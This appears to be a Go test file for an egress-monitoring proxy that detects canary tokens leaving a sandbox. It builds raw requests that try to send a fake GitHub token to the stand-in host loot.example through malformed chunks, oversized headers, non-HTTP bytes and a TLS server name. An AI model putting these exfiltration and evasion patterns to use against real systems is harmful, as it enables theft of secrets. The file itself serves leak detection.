package egress

import (
	"crypto/tls"
	"io"
	"net"
	"slices"
	"strings"
	"testing"

	"github.com/JairJosafath/mcp-customs/src/internal/canary"
	"github.com/JairJosafath/mcp-customs/src/internal/findings"
)

// serveProxy serves e's proxy, DNS and catcher on loopback until the test ends,
// and answers the proxy's address.
func serveProxy(t *testing.T, e *Egress) string {
	t.Helper()
	l, err := Listen(t.Context())
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(e.Serve(l, RedirectedFrom))
	return l.Proxy.Addr().String()
}

// sendRaw writes raw to the proxy at addr, stops writing, and reads the
// answer until the proxy closes the connection.
func sendRaw(t *testing.T, addr, raw string) {
	t.Helper()
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = conn.Close() }()
	if _, err := io.WriteString(conn, raw); err != nil {
		t.Fatal(err)
	}
	if tcp, ok := conn.(*net.TCPConn); ok {
		_ = tcp.CloseWrite()
	}
	_, _ = io.Copy(io.Discard, conn)
}

func TestWhatTheProxyCantReadAsARequestIsStillSearched(t *testing.T) {
	token := testCanaries.Get(canary.GitHubToken)
	post := "POST http://loot.example/x HTTP/1.1\r\nHost: loot.example\r\n"
	for name, tc := range map[string]struct {
		raw       string
		unscanned bool
		// host, when set, is the host the observation holding the canary
		// names: the request was read, its body not whole.
		host string
	}{
		"a chunk extension":              {post + "Transfer-Encoding: chunked\r\n\r\n2;k=" + token + "\r\nhi\r\n0\r\n\r\n", false, ""},
		"a body shorter than its length": {post + "Content-Length: 1000\r\n\r\nk=" + token, true, "loot.example"},
		"a malformed chunk":              {post + "Transfer-Encoding: chunked\r\n\r\n" + "22\r\nk=" + token + "\r\nZZ\r\n", true, "loot.example"},
		"a header over 1 MB":             {"GET http://loot.example/ HTTP/1.1\r\nHost: loot.example\r\nX-K: " + token + strings.Repeat("x", 1100<<10) + "\r\n\r\n", true, ""},
		"an invalid header name":         {"GET http://loot.example/ HTTP/1.1\r\nHost: loot.example\r\nX K: " + token + "\r\n\r\n", true, ""},
		"a bad content length":           {post + "Content-Length: nope\r\n\r\nk=" + token, true, ""},
		"an HTTP/2 preface":              {"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\nk=" + token, false, ""},
		"bytes that aren't HTTP":         {"k=" + token + "\r\n\r\n", true, ""},
		"the token after a request":      {"GET http://loot.example/ HTTP/1.1\r\nHost: loot.example\r\n\r\nk=" + token + "\r\n\r\n", false, ""},
		"a request to the proxy itself":  {"GET / HTTP/1.1\r\nHost: proxy\r\nX-K: " + token + "\r\n\r\n", false, ""},
	} {
		t.Run(name, func(t *testing.T) {
			rec := newRecorded()
			e := New(Config{CA: newCA(t), Upstream: &fakeUpstream{}})
			e.Observe(rec.observe)
			e.SetCanaries(testCanaries)
			sendRaw(t, serveProxy(t, e), tc.raw)
			rec.waitFor(t, func() bool { return hasRule(leftAs(t, rec), findings.RuleCanaryLeft) })
			if got := hasRule(leftAs(t, rec), findings.RuleBodyUnscanned); got != tc.unscanned {
				t.Errorf("findings = %+v, want %s: %v", leftAs(t, rec), findings.RuleBodyUnscanned, tc.unscanned)
			}
			if tc.host != "" && !slices.ContainsFunc(rec.of(KindHTTP), func(o any) bool {
				d, _ := o.(HTTPDetail)
				return d.Host == tc.host && len(d.Canaries) > 0
			}) {
				t.Errorf("http observations = %+v, want one of %s with the canary", rec.of(KindHTTP), tc.host)
			}
		})
	}
}

func TestATunnelsServerNameIsRecordedAndSearched(t *testing.T) {
	ca := newCA(t)
	rec := newRecorded()
	e := New(Config{CA: ca, Upstream: &fakeUpstream{}})
	e.Observe(rec.observe)
	e.SetCanaries(testCanaries)
	conn, err := net.Dial("tcp", serveProxy(t, e))
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = conn.Close() }()
	if _, err := io.WriteString(conn, "CONNECT loot.example:443 HTTP/1.1\r\nHost: loot.example:443\r\n\r\n"); err != nil {
		t.Fatal(err)
	}
	ok := make([]byte, len("HTTP/1.1 200 Connection established\r\n\r\n"))
	if _, err := io.ReadFull(conn, ok); err != nil {
		t.Fatal(err)
	}
	sni := strings.ToLower(testCanaries.Get(canary.GitHubToken)) + ".loot.example"
	client := tls.Client(conn, &tls.Config{ServerName: sni, RootCAs: ca.Pool(), MinVersion: tls.VersionTLS12})
	if err := client.HandshakeContext(t.Context()); err != nil {
		t.Fatal(err)
	}
	_ = client.Close()
	rec.waitFor(t, func() bool { return len(rec.of(KindConnect)) > 0 })
	d, _ := rec.of(KindConnect)[0].(ConnectDetail)
	if d.ServerName != sni || d.Host != "loot.example" {
		t.Errorf("connect = %+v, want the server name %s recorded", d, sni)
	}
	if !hasRule(leftAs(t, rec), findings.RuleCanaryLeft) {
		t.Errorf("findings = %+v, want the token in the server name found", leftAs(t, rec))
	}
}
